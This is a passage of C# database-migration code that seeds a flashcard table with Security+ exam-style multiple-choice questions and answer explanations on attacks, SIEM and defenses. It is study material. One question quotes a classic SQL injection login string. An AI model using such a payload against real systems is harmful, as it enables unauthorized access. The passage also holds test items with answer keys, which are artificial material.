                values: new object[] { 3, "\r\n3. C. This is a very basic form of SQL injection. Cross-site\r\nscripting would have JavaScript in the text field and would be\r\ndesigned to impact other sites from a user’s session. Cross-site\r\nrequest forgery would not involve any text being entered in the\r\nweb page, and ARP poisoning is altering the ARP table in a\r\nswitch; it is not related to website hacking.\r\n", 1, "\r\n3. You are responsible for incident response at Acme Bank. The Acme Bank website has been\r\nattacked. The attacker used the login screen, but rather than enter login credentials, they\r\nentered some odd text: ' or '1' = '1. What is the best description for this attack?\r\nA. Cross-site scripting\r\nB. Cross-site request forgery\r\nC. SQL injection\r\nD. ARP poisoning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 4, "\r\n4. B. This describes a jamming attack, where legitimate traffic is\r\ninterfered with by another signal. Jamming can be intentional or\r\nunintentional and may be intermittent. IV attacks are obscure\r\ncryptographic attacks on stream ciphers. Wi-Fi protected setup\r\n(WPS) uses a PIN to connect to the wireless access point (WAP).\r\nThe WPS attack attempts to intercept that PIN in transmission,\r\nconnect to the WAP, and then steal the WPA2 password. A\r\nbotnet is a group of machines that are being used, without their\r\nconsent, as part of an attack.\r\n", 1, "\r\n4. Users are complaining that they cannot connect to the wireless network. You discover that\r\nthe WAPs are being subjected to a wireless attack designed to block their Wi-Fi signals.\r\nWhich of the following is the best label for this attack?\r\nA. IV attack\r\nB. Jamming\r\nC. WPS attack\r\nD. Botnet\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 5, "\r\n5. B. The best option listed to defend against the attacks\r\nmentioned is input validation. Encrypting the web traffic will\r\nnot have any effect on these two attacks. A web application\r\nfirewall (WAF) might mitigate these attacks, but it would be\r\nsecondary to input validation, and an intrusion detection system\r\n(IDS) will simply detect the attack—it won’t stop it.\r\n", 1, "\r\n5. Frank is deeply concerned about attacks to his company’s e-commerce server. He is particularly\r\nworried about cross-site scripting and SQL injection. Which of the following would best\r\ndefend against these two specific attacks?\r\nA. Encrypted web traffic\r\nB. Input validation\r\nC. A firewall\r\nD. An IDS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 6, "\r\n6. C. If users have been connecting but the AP does not show\r\nthem connecting, then they have been connecting to a rogue\r\naccess point. This could be the cause of an architecture and\r\ndesign weakness such as a network without segmentation and\r\ncontrol of devices connecting to the network. Session hijacking\r\ninvolves taking over an already authenticated session. Most\r\nsession hijacking attacks involve impersonation. The attacker\r\nattempts to gain access to another user’s session by posing as\r\nthat user. Clickjacking involves causing visitors to a website to\r\nclick on the wrong item. Finally, bluejacking is a Bluetooth\r\nattack.\r\n", 1, "\r\n6. You are responsible for network security at Acme Company. Users have been reporting that\r\npersonal data is being stolen when using the wireless network. They all insist they only connect\r\nto the corporate wireless access point (AP). However, logs for the AP show that these\r\nusers have not connected to it. Which of the following could best explain this situation?\r\nA. Session hijacking\r\nB. Clickjacking\r\nC. Rogue access point\r\nD. Bluejacking\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 7, "\r\n7. C. Cross-site scripting involves entering a script into text areas\r\nthat other users will view. SQL injection is not about entering\r\nscripts, but rather SQL commands. Clickjacking is about tricking\r\nusers into clicking on the wrong thing. Bluejacking is a\r\nBluetooth attack.\r\n", 1, "\r\n7. What type of attack depends on the attacker entering JavaScript into a text area that is\r\nintended for users to enter text that will be viewed by other users?\r\nA. SQL injection\r\nB. Clickjacking\r\nC. Cross-site scripting\r\nD. Bluejacking\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 8, "\r\n8. D. Retaining the actual password is not a best practice, and\r\nthus encrypting password plain text is not a common technique\r\nto make passwords harder to crack. Since the application would\r\nneed the cryptographic key to read the passwords, anybody who\r\nhad access to that key could decrypt the passwords. Using a salt,\r\na pepper, and a cryptographic hashing algorithm designed for\r\npasswords are all common best practices to prevent offline\r\nbrute-force attacks.\r\n", 1, "\r\n8. Rick wants to make offline brute-force attacks against his password file very difficult\r\nfor attackers. Which of the following is not a common technique to make passwords\r\nharder to crack?\r\nA. Use of a salt\r\nB. Use of a pepper\r\nC. Use of a purpose-built password hashing algorithm\r\nD. Encrypting password plain text using symmetric encryption\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 9, "\r\n9. A. Although this is one of the more dated items on the\r\nSecurity+ exam outline, you need to know that the term for\r\nInternet messaging spam messages is SPIM. The rest of the\r\nanswers were made up, and though this shows up in the exam\r\noutline, the rest of the world has moved on from using this term.\r\n", 1, "\r\n9. What term is used to describe spam over Internet messaging services?\r\nA. SPIM\r\nB. SMSPAM\r\nC. IMSPAM\r\nD. TwoFaceTiming\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 10, "\r\n10. B. A segmentation fault will typically stop the program from\r\nrunning. This type of issue is why a NULL pointer or other\r\npointer de-referencing error is considered a potential security\r\nissue, as a denial-of-service condition impacts the availability of\r\nthe service. This type of error is unlikely to cause a data breach\r\nor allow privilege escalation, and permissions creep occurs as\r\nindividuals accrue more permissions over time in a single\r\norganization as their permissions are not cleaned up when they\r\nswitch positions or roles.\r\n", 1, "\r\n10. Susan is analyzing the source code for an application and discovers a pointer de-reference\r\nand returns NULL. This causes the program to attempt to read from the NULL pointer and\r\nresults in a segmentation fault. What impact could this have for the application?\r\nA. A data breach\r\nB. A denial-of-service condition\r\nC. Permissions creep\r\nD. Privilege escalation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 11, "\r\n11. C. The machines in her network are being used as bots, and the\r\nusers are not aware that they are part of a distributed denial-ofservice\r\n(DDoS) attack. Social engineering is when someone tries\r\nto manipulate you into giving information. Techniques involved\r\nin social engineering attacks include consensus, scarcity, and\r\nfamiliarity. There is a slight chance that all computers could\r\nhave a backdoor, but that is very unlikely, and attackers\r\nnormally don’t manually log into each machine to do a DDoS—it\r\nwould be automated, as through a bot.\r\n", 1, "\r\n11. Teresa is the security manager for a mid-sized insurance company. She receives a call from\r\nlaw enforcement, telling her that some computers on her network participated in a massive\r\ndenial-of-service (DoS) attack. Teresa is certain that none of the employees at her company\r\nwould be involved in a cybercrime. What would best explain this scenario?\r\nA. It is a result of social engineering.\r\nB. The machines all have backdoors.\r\nC. The machines are bots.\r\nD. The machines are infected with crypto-viruses.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 12, "\r\n12. C. There are many indicators of compromise (IoCs), including\r\nunusual outbound network traffic, geographical irregularities\r\nlike logins from a country where the person normally does not\r\nwork, or increases in database read volumes beyond normal\r\ntraffic patterns. Predictive analysis is analysis work done using\r\ndatasets to attempt to determine trends and likely attack vectors\r\nso that analysts can focus their efforts where they will be most\r\nneeded and effective. OSINT is open source intelligence, and\r\nthreat maps are often real-time or near real-time visualizations\r\nof where threats are coming from and where they are headed to.\r\nUse the following scenario for questions 13–15.\r\nChris has recently deployed a security information and event\r\nmanagement (SIEM) device and wants to use it effectively in his\r\norganization. He knows that SIEM systems have a broad range\r\nof capabilities and wants to use the features to solve problems\r\nthat he knows his organization faces. In each of the following\r\nquestions, identify the most appropriate SIEM capability or\r\ntechnique to accomplish what Chris needs to do for his\r\norganization.\r\n", 1, "\r\n12. Unusual outbound network traffic, geographical irregularities, and increases in database read\r\nvolumes are all examples of what key element of threat intelligence?\r\nA. Predictive analysis\r\nB. OSINT\r\nC. Indicators of compromise\r\nD. Threat maps\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 27, "\r\n27. B. A collection of computers that are compromised, then\r\ncentrally controlled to perform actions like denial-of-service\r\nattacks, data collection, and other malicious activities is called a\r\nbotnet. Zombienets, Nullnets, and Attacknets are not commonly\r\nused terms to describe botnets.\r\n", 1, "\r\n27. Which of the following best describes a collection of computers that have been compromised\r\nand are being controlled from one central point?\r\nA. Zombienet\r\nB. Botnet\r\nC. Nullnet\r\nD. Attacknet\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 13, "\r\n13. B. When troubleshooting TCP handshakes, the most valuable\r\ntool in many cases is packet capture. If Chris sees a series of SYN\r\npackets without the handshake being completed, he can be\r\nreasonably sure the firewall is blocking traffic. Reviewing\r\nreports or logs may be useful for this as well but won’t show the\r\nTCP handshake issue mentioned in the problem, and sentiment\r\nanalysis is focused on how individuals and groups are\r\nresponding, not on a technical problem.\r\n", 1, "\r\n13. Chris needs visibility into connection attempts through a firewall because he believes that a\r\nTCP handshake is not properly occurring. What security information and event management\r\n(SIEM) capability is best suited to troubleshooting this issue?\r\nA. Reviewing reports\r\nB. Packet capture\r\nC. Sentiment analysis\r\nD. Log collection and analysis\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 15, "\r\n15. A. Using log aggregation to pull together logs from multiple\r\nsources, and performing collection and initial analysis on log\r\ncollectors can help centralize and handle large log volumes.\r\nCapturing packets is useful for network traffic analysis to\r\nidentify issues or security concerns. Security monitoring is an\r\noverall function for security information and event management\r\n(SIEM) and doesn’t specifically help with this need. Both\r\nsentiment analysis and user behavior analysis are aimed at users\r\nand groups rather than at how data is collected and managed.\r\n", 1, "\r\n15. Chris has hundreds of systems spread across multiple locations and wants to better handle\r\nthe amount of data that they create. What two technologies can help with this?\r\nA. Log aggregation and log collectors\r\nB. Packet capture and log aggregation\r\nC. Security monitoring and log collectors\r\nD. Sentiment analysis and user behavior analysis\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 16, "\r\n16. B. White teams act as judges and observers during\r\ncybersecurity exercises. Blue teams act as defenders, red teams\r\nact as attackers, and purple teams are composed of both blue\r\nand red team members to combine attack and defense\r\nknowledge to improve organizational security.\r\n", 1, "\r\n16. What type of security team establishes the rules of engagement for a cybersecurity exercise?\r\nA. Blue team\r\nB. White team\r\nC. Purple team\r\nD. Red team\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 17, "\r\n17. A. The simplest way to ensure that APIs are only used by\r\nlegitimate users is to require the use of authentication. API keys\r\nare one of the most frequently used methods for this. If an API\r\nkey is lost or stolen, the key can be invalidated and reissued, and\r\nsince API keys can be matched to usage, Cynthia’s company can\r\nalso bill customers based on their usage patterns if they want to.\r\nA firewall or IP restrictions may be able to help, but they can be\r\nfragile; customer IP addresses may change. An intrusion\r\nprevention system (IPS) can detect and prevent attacks, but\r\nlegitimate usage would be hard to tell from those who are not\r\ncustomers using an IPS.\r\n", 1, "\r\n17. Cynthia is concerned about attacks against an application programming interface (API) that\r\nher company provides for its customers. What should she recommend to ensure that the API\r\nis only used by customers who have paid for the service?\r\nA. Require authentication.\r\nB. Install and configure a firewall.\r\nC. Filter by IP address.\r\nD. Install and use an IPS.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 18, "\r\n18. B. Buffer overflow attacks cram more data into a field or buffer\r\nthan they can accept, overflowing into other memory locations\r\nand either crashing the system or application, or potentially\r\nallowing code to be inserted into executable locations.\r\nBluesnarfing and bluejacking are both Bluetooth attacks. Crosssite\r\nscripting attacks allow attackers to inject scripts into pages\r\nviewed by other users.\r\n", 1, "\r\n18. What type of attack is based on sending more data to a target variable than the data can\r\nactually hold?\r\nA. Bluesnarfing\r\nB. Buffer overflow\r\nC. Bluejacking\r\nD. Cross-site scripting\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 19, "\r\n19. A. Attackers are attempting to influence Gurvinder with a\r\ncombination of scarcity and urgency. Thus, for this question you\r\nshould answer scarcity since urgency is not listed. In many\r\nsocial engineering principle questions, more than one of the\r\nprinciples may be in play, and you will need to answer with the\r\nprinciple that is correct or more correct for the question. In this\r\ncase, there is no intimidation or claim to authority, and\r\nconsensus would require some form of validation from others.\r\n", 1, "\r\n19. An email arrives telling Gurvinder that there is a limited time to act to get a software package\r\nfor free and that the first 50 downloads will not have to be paid for. What social engineering\r\nprinciple is being used against him?\r\nA. Scarcity\r\nB. Intimidation\r\nC. Authority\r\nD. Consensus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 20, "\r\n20. A. Vulnerability scans use automated tools to look for known\r\nvulnerabilities in systems and applications and then provide\r\nreports to assist in remediation activities. Penetration tests seek\r\nto actually exploit the vulnerabilities and break into systems.\r\nSecurity audits usually focus on checking policies, incident\r\nreports, and other documents. Security test is a generic term for\r\nany sort of test.\r\n", 1, "\r\n20. You have been asked to test your company network for security issues. The specific test you\r\nare conducting involves primarily using automated and semiautomated tools to look for\r\nknown vulnerabilities with the various systems on your network. Which of the following best\r\ndescribes this type of test?\r\nA. Vulnerability scan\r\nB. Penetration test\r\nC. Security audit\r\nD. Security test\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 21, "\r\n21. C. Username complexity has no impact in credential\r\nharvesting. Multifactor authentication can help prevent\r\nsuccessful credential harvesting by ensuring that even capture of\r\nusername and password is not enough to compromise the\r\naccount. Awareness training helps to reduce the likelihood of\r\ncredential exposure, and limiting or preventing use of thirdparty\r\nweb scripts makes websites less likely to have credentials\r\nstolen through the use of those scripts, plug-ins, or modules.\r\n", 1, "\r\n21. Susan wants to reduce the likelihood of successful credential harvesting attacks via her organization’s\r\ncommercial websites. Which of the following is not a common prevention method\r\naimed at stopping credential harvesting?\r\nA. Use of multifactor authentication\r\nB. User awareness training\r\nC. Use of complex usernames\r\nD. Limiting or preventing use of third-party web scripts and plugins\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 22, "\r\n22. C. Greg can clone a legitimate Media Access Control (MAC)\r\naddress if he can identify one on the network. This can be as\r\neasy as checking for a MAC label on some devices or by\r\ncapturing traffic on the network if he can physically access it.\r\n", 1, "\r\n22. Greg wants to gain admission to a network which is protected by a network access control\r\n(NAC) system that recognized the hardware address of systems. How can he bypass this\r\nprotection?\r\nA. Spoof a legitimate IP address.\r\nB. Conduct a denial-of-service attack against the NAC system.\r\nC. Use MAC cloning to clone a legitimate MAC address.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 23, "\r\n23. A. From the description it appears that they are not connecting\r\nto the real web server but rather a fake server. That indicates\r\ntypo squatting: have a URL that is named very similarly to a real\r\nsite so that when users mistype the real site’s URL they will go to\r\nthe fake site.\r\nOptions B, C, and D are all incorrect. These are all methods of\r\nattacking a website, but in this case, the actual website was not\r\nattacked. Instead, some users are visiting a fake site.\r\n", 1, "\r\n23. Coleen is the web security administrator for an online auction website. A small number of\r\nusers are complaining that when they visit the website it does not appear to be the correct\r\nsite. Coleen checks and she can visit the site without any problem, even from computers\r\noutside the network. She also checks the web server log and there is no record of those users\r\never connecting. Which of the following might best explain this?\r\nA. Typo squatting\r\nB. SQL injection\r\nC. Cross-site scripting\r\nD. Cross-site request forgery\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 24, "\r\n24. C. Domain hijacking, or domain theft, occurs when the\r\nregistration or other information for the domain is changed\r\nwithout the original registrant’s permission. This may occur\r\nbecause of a compromised account or due to a breach of the\r\ndomain registrar’s security. A common issue is a lapsed domain\r\nbeing purchased by a third party, and this can look like a\r\nhijacked domain, but it is a legitimate occurrence if the domain\r\nis not renewed! DNS hijacking inserts false information into a\r\nDNS server, on-path (man-in-the-middle) attacks capture or\r\nmodify traffic by causing the traffic to pass through a\r\ncompromised midpoint, and zero-day attacks are attacks that\r\nuse an unknown until used vulnerability.\r\n", 1, "\r\n24. The organization that Mike works in finds that one of their domains is directing traffic\r\nto a competitor’s website. When Mike checks, the domain information has been changed,\r\nincluding the contact and other administrative details for the domain. If the domain had not\r\nexpired, what has most likely occurred?\r\nA. DNS hijacking\r\nB. An on-path attack\r\nC. Domain hijacking\r\nD. A zero-day attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 25, "\r\n25. D. The term for low-skilled hackers is script kiddie. Script\r\nkiddies typically use prebuilt tools and do not have the expertise\r\nto make or modify their own tools. Nothing indicates this is\r\nbeing done for ideological reasons, and thus that a hacktivist is\r\ninvolved. Although “Amateur” may be an appropriate\r\ndescription, the correct term is script kiddie. Finally, nothing in\r\nthis scenario indicates an insider threat.\r\n", 1, "\r\n25. Mahmoud is responsible for managing security at a large university. He has just performed a\r\nthreat analysis for the network, and based on past incidents and studies of similar networks,\r\nhe has determined that the most prevalent threat to his network is low-skilled attackers who\r\nwish to breach the system, simply to prove they can or for some low-level crime, such as\r\nchanging a grade. Which term best describes this type of attacker?\r\nA. Hacktivist\r\nB. Amateur\r\nC. Insider\r\nD. Script kiddie\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 14, "\r\n14. D. User behavior analysis is a key capability when attempting\r\nto detect potential insider threats. Chris can use his SIEM’s\r\nbehavioral analysis capabilities to detect improper or illicit use\r\nof rights and privileges as well as abnormal behavior on the part\r\nof his users. Sentiment analysis helps analyze feelings, and log\r\naggregation and security monitoring provide ways to gain\r\ninsight into the overall security posture and status of the\r\norganization.\r\n", 1, "\r\n14. Chris wants to detect a potential insider threat using his security information and event\r\nmanagement (SIEM) system. What capability best matches his needs?\r\nA. Sentiment analysis\r\nB. Log aggregation\r\nC. Security monitoring\r\nD. User behavior analysis\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 55, "\r\n55. B. A birthday attack exploits the birthday problem in\r\nprobability theory and relies on finding collisions between\r\nrandom attack attempts and the number of potential\r\npermutations of a solution. Birthday attacks are one method of\r\nattacking cryptographic hash functions. They are not a social\r\nengineering attack, a network denial-of-service attack, or a\r\nTCP/IP protocol attack.\r\n", 1, "\r\n55. What type of attack is a birthday attack?\r\nA. A social engineering attack\r\nB. A cryptographic attack\r\nC. A network denial-of-service attack\r\nD. A TCP/IP protocol attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 56, "\r\n56. B. This an example of a disassociation attack. The\r\ndeauthentication packet causes Juanita’s system to disassociate,\r\nand the attacker can then execute a second attack targeting her\r\nauthentication credentials or other wireless data using an evil\r\ntwin attack. Misconfiguration won’t cause authenticated users to\r\ndeauthenticate. Session hijacking involves taking over an\r\nauthenticated session. Backdoors are built-in methods to\r\ncircumvent authentication.\r\n", 1, "\r\n56. Juanita is a network administrator for Acme Company. Some users complain that they keep\r\ngetting dropped from the network. When Juanita checks the logs for the wireless access point\r\n(WAP), she finds that a deauthentication packet has been sent to the WAP from the users’ IP\r\naddresses. What seems to be happening here?\r\nA. Problem with users’ Wi-Fi configuration\r\nB. Disassociation attack\r\nC. Session hijacking\r\nD. Backdoor attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 57, "\r\n57. A. Dictionary attacks use a list of words that are believed to be\r\nlikely passwords. A rainbow table is a precomputed table of\r\nhashes. Brute force tries every possible random combination. If\r\nan attacker has the original plain text and ciphertext for a\r\nmessage, they can determine the key space used through bruteforce\r\nattempts targeting the key space. Session hijacking is when\r\nthe attacker takes over an authenticated session.\r\n", 1, "\r\n57. John has discovered that an attacker is trying to get network passwords by using software\r\nthat attempts a number of passwords from a list of common passwords. What type of\r\nattack is this?\r\nA. Dictionary\r\nB. Rainbow table\r\nC. Brute force\r\nD. Session hijacking\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 87, "\r\n87. C. An intrusive scan attempts to actively exploit vulnerabilities,\r\nand thus could possibly cause some disruption of operations.\r\nFor this reason, it should be conducted outside normal business\r\nhours or in a test environment, if it is used at all. A nonintrusive\r\nscan attempts to identify vulnerabilities without exploiting\r\nthem. A penetration test actually attempts to breach the network\r\nby exploiting vulnerabilities. An audit is primarily a document\r\ncheck. Both intrusive and nonintrusive vulnerability scans can\r\nbe effective at finding vulnerabilities.\r\n", 1, "\r\n87. What is the primary difference between an intrusive and a nonintrusive vulnerability scan?\r\nA. An intrusive scan is a penetration test.\r\nB. A nonintrusive scan is just a document check.\r\nC. An intrusive scan could potentially disrupt operations.\r\nD. A nonintrusive scan won’t find most vulnerabilities.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 88, "\r\n88. C. A backdoor is a method for bypassing normal security and\r\ndirectly accessing the system. A logic bomb is malware that\r\nperforms its misdeeds when some condition is met. A Trojan\r\nhorse wraps a malicious program to a legitimate program. When\r\nthe user downloads and installs the legitimate program, they get\r\nthe malware. A rootkit is malware that gets root or\r\nadministrative privileges.\r\n", 1, "\r\n88. Your company outsourced development of an accounting application to a local programming\r\nfirm. After three months of using the product, one of your administrators discovers that the\r\ndevelopers have inserted a way to log in and bypass all security and authentication. What\r\nbest describes this?\r\nA. Logic bomb\r\nB. Trojan horse\r\nC. Backdoor\r\nD. Rootkit\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 89, "\r\n89. D. The fact that the website is defaced in a manner related to\r\nthe company’s public indicates that the attackers were most\r\nlikely engaging in hacktivism to make a political or belief-based\r\npoint. Scripts, nation-state actors, and organized crime don’t\r\naccount for the statements adverse to the company’s policies,\r\nwhich is why hacktivism is the real cause.\r\n", 1, "\r\n89. Daryl is investigating a recent breach of his company’s web server. The attacker used sophisticated\r\ntechniques and then defaced the website, leaving messages that were denouncing the\r\ncompany’s public policies. He and his team are trying to determine the type of actor who\r\nmost likely committed the breach. Based on the information provided, who was the most\r\nlikely threat actor?\r\nA. A script\r\nB. A nation-state\r\nC. Organized crime\r\nD. Hacktivists\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 90, "\r\n90. A. Pharming attempts to redirect traffic intended for a\r\nlegitimate site to another malicious site. Attackers most often do\r\nthis by changing the local hosts file or by exploiting a trusted\r\nDNS server.\r\n", 1, "\r\n90. What two techniques are most commonly associated with a pharming attack?\r\nA. Modifying the hosts file on a PC or exploiting a DNS vulnerability on a trusted\r\nDNS server\r\nB. Phishing many users and harvesting email addresses from them\r\nC. Phishing many users and harvesting many passwords from them\r\nD. Spoofing DNS server IP addresses or modifying the hosts file on a PC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 91, "\r\n91. B. Password spraying is a specific type of brute force attack\r\nwhich uses a smaller list of common passwords for many\r\naccounts to attempt to log in. Although brute forcing is\r\ntechnically correct, the best match here is password spraying.\r\nWhen you encounter questions like this on the test, make sure\r\nyou provide the most accurate answer, rather than one that fits\r\nbut may not be the best answer. Limited login attacks is a madeup\r\nanswer, and spinning an account refers to changing the\r\npassword for an account, often because of a compromise or to\r\nprevent a user from logging back into it while preserving the\r\naccount.\r\n", 1, "\r\n91. Angela reviews the authentication logs for her website and sees attempts from many different\r\naccounts using the same set of passwords. What is this attack technique called?\r\nA. Brute forcing\r\nB. Password spraying\r\nC. Limited login attacks\r\nD. Account spinning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 92, "\r\n92. C. Although you might suppose that a nation-state attacker (the\r\nusual attacker behind an advanced persistent threat) would\r\nattack from a foreign IP address, they often use a compromised\r\naddress in the target country as a base for attacks. Options A, B,\r\nand D are all incorrect. These are actually signs of an advanced\r\npersistent threat.\r\n", 1, "\r\n92. When investigating breaches and attempting to attribute them to specific threat actors, which\r\nof the following is not one of the indicators of an APT?\r\nA. Long-term access to the target\r\nB. Sophisticated attacks\r\nC. The attack comes from a foreign IP address.\r\nD. The attack is sustained over time.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 93, "\r\n93. B. A privilege escalation attack can occur horizontally, where\r\nattackers obtain similar levels of privilege but for other users, or\r\nvertically where they obtain more advanced rights. In this case,\r\nCharles has discovered a vertical privilege escalation attack that\r\nhas allowed the attacker to obtain administrative rights. Crosssite\r\nscripting and SQL injection are both common types of web\r\napplication attacks, and a race condition occurs when data can\r\nbe changed between when it is checked and when it is used.\r\n", 1, "\r\n93. Charles discovers that an attacker has used a vulnerability in a web application that his\r\ncompany runs and has then used that exploit to obtain root privileges on the web server.\r\nWhat type of attack has he discovered?\r\nA. Cross-site scripting\r\nB. Privilege escalation\r\nC. A SQL injection\r\nD. A race condition\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 94, "\r\n94. A. Evil twin attacks use a malicious access point configured to\r\nappear to be identical to a legitimate AP. Attackers wait for their\r\ntargets to connect via the evil twin, and can then capture or\r\nmodify traffic however they wish. IP spoofing uses the IP\r\naddress of a system already on the network, Trojan horses are\r\nmalware that appear to be legitimate software or files, and\r\nprivilege escalation is the process of using exploits to gain higher\r\nprivileges.\r\n", 1, "\r\n94. What type of attack uses a second wireless access point (WAP) that broadcasts the same SSID\r\nas a legitimate access point, in an attempt to get users to connect to the attacker’s WAP?\r\nA. Evil twin\r\nB. IP spoofing\r\nC. Trojan horse\r\nD. Privilege escalation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 95, "\r\n95. A. A zero-day exploit or attack occurs before the vendor has\r\nknowledge of it. The remainder of the answers don’t accurately\r\ndescribe a zero-day attack—just because it has not yet been\r\nbreached does not make it a zero-day, nor is a zero-day\r\nnecessarily quickly exploitable. Finally, a zero-day attack does\r\nnot specify how long the attacker may have access.\r\n", 1, "\r\n95. Which of the following best describes a zero-day vulnerability?\r\nA. A vulnerability that the vendor is not yet aware of\r\nB. A vulnerability that has not yet been breached\r\nC. A vulnerability that can be quickly exploited (i.e., in zero days)\r\nD. A vulnerability that will give the attacker brief access (i.e., zero days)\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 96, "\r\n96. D. Prepending is one of the stranger terms that appear on the\r\nCompTIA Security+ exam and is not a commonly used phrase in\r\nthe industry. Thus, you need to know that when it is used for\r\nthis exam it can mean one of three things: adding an expression\r\nor phrase to an email, subject line, or headers to either protect\r\nor fool users. They also note that it can be used when adding\r\ndata as part of an attack, and that social engineers may\r\n“prepend” information by inserting it into conversation to get\r\ntargets to think about things the attacker wants them to.\r\nPretexing is a social engineering technique where attackers use a\r\nreason that is intended to be believable to the target for what\r\nthey are doing. SQL injection is attempts to add SQL code to a\r\nweb query to gain additional access or data. Prepending is used\r\nto cover a wide variety of techniques in the Security+ exam\r\noutline that focus on adding information or data to existing\r\ncontent.\r\n", 1, "\r\n96. What type of attack involves adding an expression or phrase such as adding “SAFE” to\r\nmail headers?\r\nA. Pretexting\r\nB. Phishing\r\nC. SQL injection\r\nD. Prepending\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 97, "\r\n97. D. Although auditing some libraries or libraries that are\r\ncustom-developed for the code is common, auditing all libraries\r\nused in the code is unlikely except in exceptional situations. The\r\nremainder of these practices are all commonly used when\r\nworking with outsourced code development teams.\r\n", 1, "\r\n97. Charles wants to ensure that his outsourced code development efforts are as secure as\r\npossible. Which of the following is not a common practice to ensure secure remote code\r\ndevelopment?\r\nA. Ensure developers are trained on secure coding techniques.\r\nB. Set defined acceptance criteria for code security.\r\nC. Test code using automated and manual security testing systems.\r\nD. Audit all underlying libraries used in the code.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
